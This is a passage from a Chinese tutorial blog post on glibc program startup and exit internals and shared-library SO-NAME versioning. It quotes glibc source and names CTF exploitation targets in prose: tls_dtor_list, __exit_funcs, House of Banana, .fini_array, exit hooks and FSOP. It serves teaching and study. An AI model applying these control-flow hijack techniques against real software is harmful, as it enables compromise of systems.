<p>可见和 <code>_start</code> 函数里的调用一致，一共有 7 个参数，其中 <code>main</code> 由第一个参数传入，紧接着是 <code>argc</code> 和 <code>argv</code>（这里称为 <code>ubp_av</code> ，因为其中还包含了环境变量表）。除了 <code>main</code> 的函数指针之外，外部还要传入 3 个函数指针，分别是：</p>
<ul>
<li><code>init</code>：<code>main</code> 调用前的初始化工作，默认是 <code>__libc_csu_init</code> 函数指针。</li>
<li><code>fini</code>：<code>main</code> 结束后的收尾工作，默认是 <code>__libc_csu_fini</code> 函数指针。</li>
<li><code>rtld_fini</code>：和动态加载有关的收尾工作，<code>rtld</code> 是 runtime loader 的缩写。如果是动态链接程序默认是 <code>_dl_fini</code> 函数指针，如果是静态链接程序默认为 NULL 。</li>
</ul>
<p>最后的 <code>stack_end</code> 标明了栈底的地址，即最高的栈地址。</p>
<p>首先初始化 <code>__libc_multiple_libcs</code> 为 0 之后 <code>generic_start_main</code> 会调用 <code>__cxa_atexit </code> 将 <code>rtld_fini</code> 注册为 <code>main</code> 函数结束后的回调函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">  __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
<p>当然如果是静态链接程序还会做一些额外的初始化，在动态链接程序中这些初始化是在动态连接器中完成的。</p>
<ul>
<li>如果是开启 PIE 的静态程序会调用 <code>_dl_relocate_static_pie</code> 函数初始化 <code>link_map</code> 并且进行重定位。</li>
<li>初始化 <code>__environ</code> 。</li>
<li>初始化 <code>__libc_stack_end</code> 。</li>
<li>调用 <code>dl_aux_init</code> 根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作。</li>
<li>如果<strong>程序头表</strong>指针 <code>dl_phdr</code> 没有初始化，就通过 ELF 文件头的 <code>e_phoff</code> 初始化 <code>dl_phdr</code>（程序头表地址），通过 <code>e_phnum</code> 初始化 <code>dl_phnum</code>（程序头表中的项数）。不过这个一般在上一步根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作时就已经初始化过了。</li>
<li>调用 <code>_libc_init_secure</code> 函数，如果 <code>_libc_enable_secure_decided</code> 不为 0 则初始化 <code>_libc_enable_secure</code> 为 <code>(__geteuid() != __getuid() || __getegid() != __getgid())</code> 。<ul>
<li><code>__geteuid() != __getuid()</code>：比较有效用户 ID（effective user ID）和实际用户 ID（real user ID）。如果它们不相等，表示当前进程以特权用户身份运行（比如以 root 用户权限运行）。</li>
<li><code>__getegid() != __getgid()</code>：比较有效组 ID（effective group ID）和实际组 ID（real group ID）。如果它们不相等，表示当前进程以特权用户组身份运行。</li>
<li>这段代码的目的是判断当前进程是否以特权用户或特权用户组身份运行。这在某些情况下可能需要采取不同的安全措施或限制特权操作。</li>
</ul>
</li>
<li>调用 <code>__tunables_init</code> 函数从环境变量中提取信息，并用于初始化可调节项列表，以便在程序运行时可以根据这些可调节项来进行相应的配置或调整。</li>
<li>使用 <code>ARCH_INIT_CPU_FEATURES</code> 宏初始化 CPU 的相关参数到 <code>cpu_features</code> 类型的结构体 <code>_dl_x86_cpu_features</code> 中。</li>
<li>重定位代码中的绝对地址引用 。</li>
<li>调用 <code>__libc_setup_tls</code> 函数初始化 tls 。</li>
<li>如果 <code>__libc_multiple_libcs</code> 为 0 则调用 <code>DL_SYSDEP_OSCHECK</code> 宏来初始化 <code>dl_osversion</code> 为内核版本号。</li>
<li>调用 <code>__pthread_initialize_minimal</code> 函数初始化线程库 。</li>
<li>初始化 <code>__stack_chk_guard</code> 。</li>
<li>初始化 <code>pointer_chk_guard</code> 。</li>
<li>调用 <code>_libc_init_first</code> 函数初始化 <code>_libc_argc</code> ，<code>_libc_argv</code> 和 <code>environ</code> 等。</li>
<li>调用 <code>__cxa_atexit</code> 函数将 <code>fini</code> 注册为 <code>main</code> 函数结束后的回调函数 。</li>
</ul>
<p>之后判断函数指针 <code>init</code> 是否为空，如果不为空则调用该函数指针，也就是 <code>__libc_csu_init</code> 函数。</p>
<p><code>__libc_csu_init</code> 函数定义在 <code>csu/elf-init.c</code> 中，内容如下：</p>
<ul>
<li>如果是<strong>静态链接程序</strong>会依次调用函数指针数组 <code>__preinit_array_start </code> 中的所有函数。</li>
<li>调用 <code>_init </code> 函数。</li>
<li>依次调用函数指针数组 <code>__init_array_start</code>（<code>.init_array</code>）中的所有函数。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
其中调用的 <code>init</code> 函数如下：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:0000037C push    ebx                             ; _init</span><br><span class="line">.init:0000037D sub     esp, 8</span><br><span class="line">.init:00000380 call    __x86_get_pc_thunk_bx</span><br><span class="line">.init:00000380</span><br><span class="line">.init:00000385 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.init:0000038B mov     eax, ds:(__gmon_start___ptr - 1FD8h)[ebx]</span><br><span class="line">.init:00000391 test    eax, eax</span><br><span class="line">.init:00000393 jz      short loc_39A</span><br><span class="line">.init:00000393</span><br><span class="line">.init:00000395 call    ___gmon_start__</span><br><span class="line">.init:00000395</span><br><span class="line">.init:0000039A</span><br><span class="line">.init:0000039A loc_39A:                                ; CODE XREF: _init_proc+17↑j</span><br><span class="line">.init:0000039A add     esp, 8</span><br><span class="line">.init:0000039D pop     ebx</span><br><span class="line">.init:0000039E retn</span><br></pre></td></tr></table></figure></div>
在静态链接程序中直接 <code>mov eax, 0; test eax, eax;</code> ，因此这个函数什么也不做。而动态链接程序中由于此时 <code>__gmon_start___@got</code> 为 NULL ，因此同样什么也不做。</li>
</ul>
<p>从 <code>__libc_csu_init</code> 函数返回后会调用 <code>main</code> 函数和 <code>exit</code> 函数。</p>
<h2 id="exit-中的-hook"><a href="#exit-中的-hook" class="headerlink" title="exit 中的 hook"></a>exit 中的 hook</h2><p><code>exit</code> 函数定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stdlib/exit.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span> &#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">//首先销毁TLS</span></span><br><span class="line">        __call_tls_dtors ();</span><br><span class="line">    <span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line">    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line">    _exit (status);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    _exit (int status) &#123;</span></span><br><span class="line"><span class="comment">        status &amp;= 0xff;</span></span><br><span class="line"><span class="comment">        abort ();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先 <code>__call_tls_dtors</code> 会被 <code>exit</code> 调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (tls_dtor_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">        dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">        PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">        func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">        atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后可以劫持 <code>tls_dtor_list</code> ，构造 <code>dtor_list</code> 结构体控制 rdi（<code>obj</code> 域）和 rdx（<code>next</code> 域），进而利用 <code>setcontext</code> 来劫持程序执行流程 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> &#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后（如果该 glibc 版本加密了该函数指针）可以通过劫持 <code>__exit_funcs</code> 数组来获取控制流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	    <span class="keyword">switch</span> (f-&gt;flavor) &#123;</span><br><span class="line">	        <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	        <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">case</span> ef_free:</span><br><span class="line">	        <span class="keyword">case</span> ef_us:</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_on:</span><br><span class="line">	            onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_at:</span><br><span class="line">	            atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            atfct ();</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	            cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但这种方法只能控制 rsi 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	    &#125; on;</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	        <span class="type">void</span> *dso_handle;</span><br><span class="line">	    &#125; cxa;</span><br><span class="line">    &#125; func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>如果是<strong>动态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>_dl_fini</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004857778.png"
                      alt="image-20241108004857778"
                ><br><code>_dl_fini</code> 函数定义如下，该函数的主要作用就是依次调用 <code>link_map-&gt;l_info[DT_FINI_ARRAY]</code> 中描述的函数数组中的函数指针。有一种攻击方法就是通过伪造 <code>link_map</code> 来实现控制流劫持，这种攻击方法叫做 <strong>House Of Banana</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略了有关SHARED的操作</span></span><br><span class="line"><span class="type">void</span> internal_function _dl_fini (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span>)</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	        assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	        <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">//将_rtld_global.dl_ns[ns]._ns_loaded链表的结点经过check后置入maps</span></span><br><span class="line">	            <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">		            assert (i &lt; nloaded);</span><br><span class="line">                    maps[i] = l;</span><br><span class="line">		            l-&gt;l_idx = i;</span><br><span class="line">		            ++i;</span><br><span class="line">		            ++l-&gt;l_direct_opencount;</span><br><span class="line">	            &#125;</span><br><span class="line">	        assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	        assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//_ns_loaded链表中至少有三个节点</span></span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line">	        _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">	        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">	            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">                <span class="comment">//遍历执行maps[i]里的函数指针</span></span><br><span class="line">	            <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">		            l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">		            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	        	        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, DSO_FILENAME (l-&gt;l_name), ns);</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			                ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			                    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			            &#125;</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			                DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">	            --l-&gt;l_direct_opencount;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>_dl_fini</code> 中的 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 宏展开后分别为 <code>_rtld_local._dl_rtld_lock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 和 <code>_rtld_local._dl_rtld_unlock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 因此我们可以劫持对应函数指针完成控制流劫持，这些函数指针就是<strong>狭义上的 exit hook</strong> 。</p>
<p>如果是<strong>静态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>__libc_csu_fini</code> 函数。<code>__libc_csu_fini</code> 函数会依次调用 <code>.fini_array</code> 中的函数指针，因此我们可以通过改写 <code>.fini_array</code> 实现控制流劫持。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="type">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>RUN_HOOK</code> 宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure></div>
<p>这个宏展开后的结果如下，可以看到这个宏会依次调用 <code>__start___libc_atexit</code> 函数指针数组直到遇到 NULL 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> *ptr;</span><br><span class="line">    <span class="keyword">for</span> (ptr = (<span class="type">void</span> *<span class="type">const</span> *) ((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start___libc_atexit)); !((ptr) &gt;= (<span class="type">void</span> *<span class="type">const</span> *) &amp;__stop___libc_atexit); ++ptr) (*(<span class="type">____libc_atexit_hook_function_t</span> *) *ptr)();</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>函数指针所在的内存在动态链接程序中位于 libc 上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004928203.png"
                      alt="image-20241108004928203"
                ><br>在静态链接程序中位于程序的 <code>__libc_atexit</code> 段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004951294.png"
                      alt="image-20241108004951294"
                ><br>用于 <strong><code>FSOP</code></strong> 的 <code>_IO_cleanup</code> 就是在这里被调用的，另外如果我们能控制这里的函数指针也可以劫持程序执行流程。</p>
<h1 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h1><h2 id="共享库版本"><a href="#共享库版本" class="headerlink" title="共享库版本"></a>共享库版本</h2><h3 id="共享库版本命名"><a href="#共享库版本命名" class="headerlink" title="共享库版本命名"></a>共享库版本命名</h3><p>Linux有一套规则来命名系统中的每一个共享库，它规定共享库的文件名规则必须如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libname.so.x.y.z</span><br></pre></td></tr></table></figure></div>
<p>最前面使用前缀 <code>lib</code> 、中间是库的名字和后缀 <code>.so</code> ，最后面跟着的是三个数字组成的版本号。<code>x</code> 表示主版本号（Major Version Number），<code>y</code> 表示次版本号（Minor Version Number），<code>z</code> 表示发布版本号（Release Version Number）。三个版本号的含义不一样。</p>
<ul>
<li>主版本号表示库的重大升级，不同主版本号的库之间是不兼容的，依赖于旧的主版本号的程序需要改动相应的部分，并且重新编译，才可以在新版的共享库中运行；或者，系统必须保留旧版的共享库，使得那些依赖于旧版共享库的程序能够正常运行。</li>
<li>次版本号表示库的增量升级，即增加一些新的接口符号，且保持原来的符号不变。在主版本号相同的情况下，高的次版本号的库向后兼容低的次版本号的库。</li>
<li>发布版本号表示库的一些错误的修正、性能的改进等，并不添加任何新的接口，也不对接口进行更改。相同主版本号、次版本号的共享库，不同的发布版本号之间完全兼容，依赖于某个发布版本号的程序可以在任何一个其他发布版本号中正常运行，而无须做任何修改。</li>
</ul>
<h3 id="SO-NAME"><a href="#SO-NAME" class="headerlink" title="SO-NAME"></a>SO-NAME</h3><p>系统普遍采用一种叫做 SO-NAME 的命名机制来记录共享库的依赖关系。每个共享库都有一个对应的 SO-NAME ，这个 SO-NAME 即共享库的文件名去掉次版本号和发布版本号，保留主版本号。比如一个共享库叫做 <code>libfoo.so.2.6.1</code> ，那么它的 SO-NAME 即 <code>libfoo.so.2</code> 。很明显，SO-NAME 规定了共享库的接口，SO-NAME 的两个相同共享库，次版本号大的兼容次版本号小的。在 Linux 系统中，系统会为每个共享库在它所在的目录创建一个跟 SO-NAME 相同的并且指向它的软链接（Symbol Link）。比如系统中有存在一个共享库 <code>/lib/libfoo.so.2.6.1</code> ，那么 Linux 中的共享库管理程序就会为它产生一个软链接 <code>/lib/libfoo.so.2</code> 指向它。比如 Linux 系统的 Glibc 共享库（注意稍高版本的 libc 的 <code>libc.so.6</code> 本身就是动态库，不是符号链接）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 Apr  7  2022 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so</span><br><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">-rwxr-xr-x 1 root root 2029592 Apr  7  2022 /lib/x86_64-linux-gnu/libc-2.31.so</span><br></pre></td></tr></table></figure></div>
<p>由于历史原因，动态链接器和 C 语言库的共享对象文件名规则不按 Linux 标准的共享库命名方法，但是 C 语言的 SO-NAME 还是按照正常的规则。</p>
<p>另外动态连接器的 SO-NAME 命名不按照普通的规则。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /lib64/ld-linux-x86-64.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 32 Apr  7  2022 /lib64/ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so</span><br></pre></td></tr></table></figure></div>

<p>建立以 SO-NAME 为名字的软链接目的是，使得所有依赖某个共享库的模块，在编译、链接和运行时，都使用共享库的 SO-NAME ，而不使用详细的版本号。</p>
<p>动态链接文件中的 <code>.dynamic</code> 段中的 <code>DT_NEED</code> 类型的字段就是 SO-NAME 而不是共享库的完整名字，这样当动态链接器进行共享库依赖文件查找时，就会根据系统中各种共享库目录中的SO-NAME软链接自动定向到最新版本的共享库。</p>
<p>当共享库进行升级的时候，如果只是进行增量升级，即保持主版本号不变，只改变次版本号或发布版本号，那么我们可以直接将新版的共享库替换掉旧版，并且修改 SO-NAME 的软链接指向新版本共享库，即可实现升级；当共享库的主版本号升级时，系统中就会存在多个 SO-NAME ，由于这些 SO-NAME 并不相同，所以已有的程序并不会受影响。</p>
<p>Linux 中提供了一个工具叫做 <code>ldconfig</code> ，当系统中安装或更新一个共享库时，就需要运行这个工具，它会遍历所有的默认共享库目录，比如 <code>/lib</code> 、<code>/usr/lib</code> 等，然后更新所有的软链接，使它们指向最新版的共享库；如果安装了新的共享库，那么 <code>ldconfig</code> 会为其创建相应的软链接。</p>
